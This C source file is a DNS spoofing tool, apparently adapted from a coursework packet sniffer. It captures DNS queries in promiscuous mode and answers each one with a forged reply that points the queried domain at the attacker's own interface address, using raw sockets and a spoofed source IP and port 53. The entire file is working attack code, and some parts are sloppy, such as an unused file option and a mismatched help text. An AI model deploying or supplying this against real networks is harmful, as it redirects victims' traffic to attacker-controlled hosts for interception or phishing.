#include <stdio.h>
#include <pcap.h>
#include <getopt.h>
#include <netinet/in.h>
#include <string.h>
#include <stdlib.h>
#include <ctype.h>
#include <errno.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <time.h>
#include <netdb.h>
#include <unistd.h>
#include <net/ethernet.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <resolv.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <unistd.h>

#define PROMISC 1			/* Promiscuos mode set for pcap_open_live */
#define READ_TIME_OUT 0		/* read time out for pcap_open_live */
#define SIZE_ETHERNET 14	/* ethernet headers are always exactly 14 bytes */
#define IP_SIZE 16
#define PACKET_SIZE 8192

/* Ethernet header */
struct ethernet_header {
	u_char ether_dhost[ETHER_ADDR_LEN]; /* Destination host address */
	u_char ether_shost[ETHER_ADDR_LEN]; /* Source host address */
	u_short ether_type; 				/* IP? ARP? RARP? etc */
};

/* DNS header */
struct dns_header {
	char id[2];
	char flags[2];
	char qdcount[2];
	char ancount[2];
	char nscount[2];
	char arcount[2];
};

/* DNS Question structure */
struct dns_question {
	char *qname;
	char qtype[2];
	char qclass[2];
};


// http://www.microhowto.info/howto/get_the_ip_address_of_a_network_interface_in_c_using_siocgifaddr.html
void get_ip_of_attacker(char *if_name, char *ip) {
	struct ifreq ifr;

	size_t if_name_len = strlen(if_name);

	if (if_name_len < sizeof(ifr.ifr_name)) {
		memcpy(ifr.ifr_name, if_name, if_name_len);
		ifr.ifr_name[if_name_len] = 0;
	} else {
		fprintf(stderr, "interface name is too long");
	}

	int fd = socket(AF_INET, SOCK_DGRAM, 0);
	if (fd == -1) {
		fprintf(stderr, "%s", strerror(errno));
	}

	if (ioctl(fd, SIOCGIFADDR, &ifr) == -1) {
		int temp_errno = errno;
		close(fd);
		fprintf(stderr, "%s", strerror(temp_errno));
	}
	close(fd);

	struct sockaddr_in* ipaddr = (struct sockaddr_in*)&ifr.ifr_addr;
	memcpy(ip, inet_ntoa(ipaddr->sin_addr), 32);
}


/*
 * Calculates a checksum for a given header
 * http://web.eecs.utk.edu/~cs594np/unp/checksum.html
 */
unsigned short find_checksum(unsigned short *buf, int len) {
	long sum = 0;  /* assume 32 bit long, 16 bit short */

	while (len > 1) {
		sum += *buf++;
		if (sum & 0x80000000)  /* if high order bit set, fold */
			sum = (sum & 0xFFFF) + (sum >> 16);
		len -= 2;
	}

	if (len)      /* take care of left over byte */
		sum += (unsigned short) * (unsigned char *)buf;

	while (sum >> 16)
		sum = (sum & 0xFFFF) + (sum >> 16);

	return ~sum;
}


/**
 * Sends a dns answer using raw sockets
 */
void send_dns_answer(char* ip, u_int16_t port, char* packet, int packlen) {
	struct sockaddr_in to_addr;
	int bytes_sent, sock, one = 1;

	sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
	if (sock < 0) {
		fprintf(stderr, "Error creating socket");
		return;
	}

	to_addr.sin_family = AF_INET;
	to_addr.sin_port = htons(port);
	to_addr.sin_addr.s_addr = inet_addr(ip);

	if (setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) < 0) {
		fprintf(stderr, "Error at setsockopt()");
		return;
	}

	bytes_sent = sendto(sock, packet, packlen, 0, (struct sockaddr *)&to_addr, sizeof(to_addr));
	if (bytes_sent < 0)
		fprintf(stderr, "Error sending data");
}


/* The callback function for pcap_loop */
void dns_spoof(unsigned char *args, const struct pcap_pkthdr *header, const u_char *packet)
{
	struct ethernet_header *ether;
	struct iphdr *ip;
	struct udphdr *udp, *reply_udp_hdr;
	struct ip *reply_ip_hdr;
	struct dns_question question, *dns_question_in;
	struct dns_header *dns_hdr;
	char src_ip[IP_SIZE], dst_ip[IP_SIZE];
	unsigned int ip_header_size;
	u_int16_t port;
	char request[150], *domain_name;
	char reply_packet[PACKET_SIZE];
	int size, i = 1, j = 0, k;
	unsigned int reply_packet_size;
	char spoof_ip[32], *reply;
	unsigned char ans[4];
	struct in_addr dest, src;


	get_ip_of_attacker("ens33", spoof_ip);
	memset(reply_packet, 0, PACKET_SIZE);

	/* define ethernet header */
	ether = (struct ethernet_header*)(packet);
	ip = (struct iphdr*)(((char*) ether) + sizeof(struct ethernet_header));

	// get cleaned up IPs
	src.s_addr = ip->saddr;
	dest.s_addr = ip->daddr;
	sprintf(src_ip, "%s", inet_ntoa(src));
	sprintf(dst_ip, "%s", inet_ntoa(dest));


	/* udp header */
	ip_header_size = ip->ihl * 4;
	udp = (struct udphdr*)(((char*) ip) + ip_header_size);

	/* dns header */
	dns_hdr = (struct dns_header*)(((char*) udp) + sizeof(struct udphdr));
	question.qname = ((char*) dns_hdr) + sizeof(struct dns_header);

	// parse domain name
	domain_name = question.qname;
	size = domain_name[0];
	while (size > 0) {
		for (k = 0; k < size; k++) {
			request[j++] = domain_name[i + k];
		}
		request[j++] = '.';
		i += size;
		size = domain_name[i++];
	}
	request[--j] = '\0';


	/* reply is pointed to the beginning of dns header */
	reply = reply_packet + sizeof(struct ip) + sizeof(struct udphdr);

	// reply dns_hdr
	memcpy(&reply[0], dns_hdr->id, 2);
	memcpy(&reply[2], "\x81\x80\x00\x01\x00\x01\x00\x00\x00\x00", 10);

	// reply dns_question
	dns_question_in = (struct dns_question*)(((char*) dns_hdr) + sizeof(struct dns_header));
	size = strlen(request) + 2;
	memcpy(&reply[12], dns_question_in, size);
	size += 12;
	memcpy(&reply[size], "\x00\x01\x00\x01", 4);
	size += 4;

	// reply dns_answer
	memcpy(&reply[size], "\xc0\x0c\x00\x01\x00\x01\x00\x00\x00\x22\x00\x04", 12);
	size += 12;
	sscanf(spoof_ip, "%d.%d.%d.%d", (int *)&ans[0], (int *)&ans[1], (int *)&ans[2], (int *)&ans[3]);
	memcpy(&reply[size], ans, 4);
	size += 4;

	reply_packet_size = size;

	// IP datatgram
	reply_ip_hdr = (struct ip *) reply_packet;
	reply_udp_hdr = (struct udphdr *) (reply_packet + sizeof (struct ip));
	reply_ip_hdr->ip_hl = 5; //header length
	reply_ip_hdr->ip_v = 4; //version
	reply_ip_hdr->ip_tos = 0; //tos
	reply_ip_hdr->ip_len = sizeof(struct ip) + sizeof(struct udphdr) + reply_packet_size;  //length
	reply_ip_hdr->ip_id = 0; //id
	reply_ip_hdr->ip_off = 0; //fragment offset
	reply_ip_hdr->ip_ttl = 255; //ttl
	reply_ip_hdr->ip_p = 17; //protocol
	reply_ip_hdr->ip_sum = 0; //temp checksum
	reply_ip_hdr->ip_src.s_addr = inet_addr(dst_ip); //src ip - spoofed
	reply_ip_hdr->ip_dst.s_addr = inet_addr(src_ip); //dst ip

	reply_udp_hdr->source = htons(53); //src port - spoofed
	reply_udp_hdr->dest = udp->source;
	reply_udp_hdr->len = htons(sizeof(struct udphdr) + reply_packet_size); //length
	reply_udp_hdr->check = 0; //checksum - disabled

	reply_ip_hdr->ip_sum = find_checksum((unsigned short *) reply_packet, reply_ip_hdr->ip_len >> 1);

	/* update the datagram size with ip and udp header */
	reply_packet_size += (sizeof(struct ip) + sizeof(struct udphdr));

	/* sends our dns spoof msg */
	send_dns_answer(src_ip, ntohs((*(u_int16_t*)&udp)), reply_packet, reply_packet_size);
	// // printf("%s\n", datagram);
	printf("Spoofed %s requested from %s\n", request, src_ip);
}


int main(int argc, char *argv[])
{
	char *dev = NULL;				/* capture device name */
	char errbuf[PCAP_ERRBUF_SIZE];	/* error buffer */
	struct bpf_program fp;			/* The compiled filter expression */
	char *bpf_filter_exp;			/* The filter expression */
	bpf_u_int32 net;				/* The IP of our sniffing device */
	bpf_u_int32 mask;				/* The netmask of our sniffing device */
	pcap_t *handle;					/* packet capture handle */
	int interface_provided = 0;		/* flag to mark interface option */
	int read_file = 0;				/* flag to mark read option */
	int filter_string_found = 0;	/* flag to mark interface string filter */
	char dns_filter[200];
	int bpf_filter = 0;				/* flag to mark bpf_filter expression */
	int option = 0;					/* for switching on getopt */
	unsigned char *filter_str = NULL;		/* filter string */
	char *file_name;				/* filename for read option */


	memset(errbuf, 0, PCAP_ERRBUF_SIZE);

	/* Parse the command line arguments */
	while ((option = getopt(argc, argv, "i:f:h")) != -1) {
		switch (option) {
		case 'i':
			if (interface_provided) {
				printf("You should provide only one device. Multiple devices "
				       "are not supported.\n");
				exit(EXIT_FAILURE);
			}
			dev = optarg;
			interface_provided = 1;
			break;
		case 'f':
			if (read_file) {
				printf("You should provide only one file. Multiple files "
				       "are not supported.\n");
				exit(EXIT_FAILURE);
			}
			file_name = optarg;
			read_file = 1;
			break;
		case 'h':
			printf("help: mydump [-i interface] [-r file] [-s string] "
			       "expression\n-i  Listen on network device <interface> "
			       "(e.g., eth0). If not specified, mydump selects the default "
			       "interface to listen on.\n-r  Read packets from <file>\n-s  "
			       "Keep only packets that contain <string> in their payload."
			       "\n<expression> is a BPF filter that specifies which packets "
			       "will be dumped. If no filter is given, all packets seen on "
			       "the interface (or contained in the trace) will be dumped. "
			       "Otherwise, only packets matching <expression> will be "
			       "dumped.\n");
			exit(EXIT_SUCCESS);
			break;
		default:
			printf("unknown option or missing argument! Exiting.\n");
			exit(EXIT_FAILURE);
		}
	}

	if (optind < argc) {
		bpf_filter_exp = argv[optind];
		bpf_filter = 1;
	}

	/* if interface not provided by user, set through pcap library */
	if (interface_provided != 1) {
		dev = pcap_lookupdev(errbuf);
		if (dev == NULL) {
			fprintf(stderr, "Couldn't find default device: %s\n", errbuf);
			exit(EXIT_FAILURE);
		}
	}

	/*
	 * get IPv4 network numbers and corresponding network mask
	 * (the network number is the IPv4 address ANDed with the network mask
	 * so it contains only the network part of the address).
	 * This was essential because we needed to know the network mask
	 * in order to apply the filter
	 */
	if (pcap_lookupnet(dev, &net, &mask, errbuf) == -1) {
		fprintf(stderr, "Can't get netmask for device %s\n", dev);
		net = 0;
		mask = 0;
	}

	/*
	 * create handle for the file provided by user,
	 * or open device to read.
	 */
	// if (read_file == 1) {
	// handle = pcap_open_offline(file_name, errbuf);   //call pcap library function
	// if (handle == NULL) {
	// 	fprintf(stderr, "Couldn't open pcap file %s: %s\n", file_name, errbuf);
	// 	exit(EXIT_FAILURE);
	// } else {
	// 	printf("Opened file %s\n\n", file_name);
	// }
	// } else {
	// 	handle = pcap_open_live(dev, BUFSIZ, PROMISC, READ_TIME_OUT, errbuf);
	// 	if (handle == NULL) {
	// 		fprintf(stderr, "Couldn't open device %s: %s\n", dev, errbuf);
	// 		exit(EXIT_FAILURE);
	// 	} else {
	// 		printf("Listening on device: %s\n\n", dev);
	// 	}
	// }

	handle = pcap_open_live(dev, BUFSIZ, PROMISC, READ_TIME_OUT, errbuf);
	if (handle == NULL) {
		fprintf(stderr, "Couldn't open device %s: %s\n", dev, errbuf);
		exit(EXIT_FAILURE);
	} else {
		printf("Listening on device: %s\n\n", dev);
	}

	// /* fail if the device doesn't supply Ethernet headers */
	// if (pcap_datalink(handle) != DLT_EN10MB) {
	// 	fprintf(stderr, "Device %s doesn't provide Ethernet headers - not "
	// 	        "supported\n", dev);
	// 	exit(EXIT_FAILURE);
	// }

	/* if user specified am expression, compile and set bpf filter */
	// if (bpf_filter) {
	// 	/* compile the program */
	// 	if (pcap_compile(handle, &fp, bpf_filter_exp, 0, net) == -1) {
	// 		fprintf(stderr, "Couldn't parse filter %s: %s\n", bpf_filter_exp,
	// 		        pcap_geterr(handle));
	// 		exit(EXIT_FAILURE);
	// 	}

	// 	/* apply the filter */
	// 	if (pcap_setfilter(handle, &fp) == -1) {
	// 		fprintf(stderr, "Couldn't install filter %s: %s\n", bpf_filter_exp,
	// 		        pcap_geterr(handle));
	// 		exit(EXIT_FAILURE);
	// 	}
	// }

	sprintf(dns_filter, "udp and dst port domain");

	/* compile the program */
	// if (pcap_compile(handle, &fp, dns_filter, 0, net) == -1) {
	if (pcap_compile(handle, &fp, dns_filter, 0, 0) == -1) {
		fprintf(stderr, "Couldn't parse filter %s: %s\n", dns_filter,
		        pcap_geterr(handle));
		exit(EXIT_FAILURE);
	}

	/* apply the filter */
	if (pcap_setfilter(handle, &fp) == -1) {
		fprintf(stderr, "Couldn't install filter %s: %s\n", dns_filter,
		        pcap_geterr(handle));
		exit(EXIT_FAILURE);
	}

	/* set our callback function with infinite pcap_loop */
	pcap_loop(handle, -1, dns_spoof, filter_str);

	/* clean up */
	pcap_freecode(&fp);
	pcap_close(handle);

	return 0;
}
